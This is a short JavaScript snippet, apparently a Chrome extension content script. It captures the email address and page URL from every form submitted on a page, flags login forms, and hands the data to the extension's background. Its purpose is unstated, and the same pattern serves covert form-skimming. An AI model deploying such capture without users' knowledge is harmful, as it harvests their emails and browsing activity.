document.addEventListener('submit', function (event) {
    const form = event.target;
    const emailInput = form.querySelector('input[type="email"]'); // Adjust selector as needed
    const passwordInput = form.querySelector('input[type="password"]'); // Detects login forms

    if (emailInput) {
        const email = emailInput.value;
        const url = window.location.href;

        // Determine if this is a login or registration form
        let messageType = passwordInput ? 'login_attempt' : 'form_submission';

        chrome.runtime.sendMessage({
            type: messageType,
            email: email,
            url: url
        });
    }
});